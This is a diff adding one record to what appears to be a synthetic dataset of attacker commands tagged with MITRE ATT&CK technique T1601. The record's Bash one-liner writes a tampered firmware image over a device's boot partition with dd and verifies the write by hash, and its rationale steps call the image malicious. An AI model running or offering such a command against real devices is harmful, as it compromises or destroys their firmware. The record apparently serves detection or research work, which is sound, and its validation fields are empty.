@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "IMG=/root/firmware_mod.img; H1=$(sha256sum \"$IMG\" | awk '{print $1}'); dd if=\"$IMG\" of=/dev/mmcblk0p1 bs=4M conv=fsync status=none; H2=$(dd if=/dev/mmcblk0p1 bs=1 count=$(stat -c%s \"$IMG\") status=none | sha256sum | awk '{print $1}'); [ \"$H1\" = \"$H2\" ] || echo 'boot partition verify failed'",
+  "explanation": "Writes a modified firmware image to the boot partition and verifies the write by hashing the exact byte range written.",
+  "rationale_steps": [
+    "Calculate the malicious image's hash before deployment.",
+    "Flash the boot partition with the tampered image.",
+    "Read back and hash the same number of bytes to confirm an exact match."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-dc873ff7-ed53f67f",
+  "source_prompt_hash": "dc873ff7",
+  "timestamp_utc": "2025-09-30T04:57:26.660610Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
